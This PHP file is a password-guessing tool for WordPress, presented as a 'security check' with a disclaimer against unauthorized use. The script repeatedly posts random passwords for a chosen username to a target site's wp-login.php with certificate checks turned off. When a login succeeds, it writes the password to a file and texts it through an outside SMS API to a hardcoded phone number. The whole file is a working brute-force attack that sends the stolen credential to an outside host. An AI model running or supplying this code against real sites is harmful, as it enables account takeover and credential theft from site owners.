<?php
/*

WordPress Security Check :)

This code is intended solely for checking WordPress security and is not meant for unauthorized access to anyone's websites!

Autor: HF8FRN

*/
$username = ""; // Username for which you want to obtain a password
$domain = ""; // WordPress site domain for which you want to obtain a password

$apiKey = ""; // API key from smsspeed.pl to receive password notification

// Define available characters
$characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:,.<>?';

// Set minimum and maximum password length
$min_length = 6;
$max_length = 16;

$password = ""; // Variable to store the generated password

while (true) {
    // Randomly select password length
    $password_length = rand($min_length, $max_length);

    // Initialize a variable to store the result
    $random_password = '';

    // Generate and add characters to the password
    for ($i = 0; $i < $password_length; $i++) {
        $random_index = rand(0, strlen($characters) - 1);
        $random_password .= $characters[$random_index];
    }

    $password = $random_password;

    $login_url = "https://$domain/wp-login.php"; 

    $cookie_file = "cookie.txt"; // Cookie file to store the session

    // Initialize Curl session
    $ch = curl_init();

    // Curl settings
    curl_setopt($ch, CURLOPT_URL, $login_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

    // Data to send in the login form
    $post_data = array(
        'log' => $username,
        'pwd' => $password,
        'wp-submit' => 'Log In',
        'testcookie' => '1',
    );

    // Set POST request
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_data));

    // Perform login request
    $response = curl_exec($ch);

    if (strpos($response, 'Invalid username') !== false) {
        echo "Invalid username or password. Trying again...\n";
    } elseif (strpos($response, 'Log Out') !== false) {
        echo "Logged in successfully.\n";

        // Save the password to a file
        $password_file = fopen("password.txt", "w");
        fwrite($password_file, $password);
        fclose($password_file);

        $message = "SUCCESS!

Password: $password";
        $sms_ch = curl_init('https://panel.smsspeed.pl/api');
        curl_setopt($sms_ch, CURLOPT_POST, 1);
        curl_setopt($sms_ch, CURLOPT_POSTFIELDS,
        "api=$apiKey&xxt=sms&sender=SYSTEM&to=729664512&message=$message");
        curl_setopt($sms_ch, CURLOPT_RETURNTRANSFER, true);
        $sms_out = curl_exec($sms_ch);
        curl_close($sms_ch);

        break;
    } else {
        echo "An error occurred during login. Trying again...\n";
        sleep(1);
    }

    // Close Curl session
    curl_close($ch);
}
?>
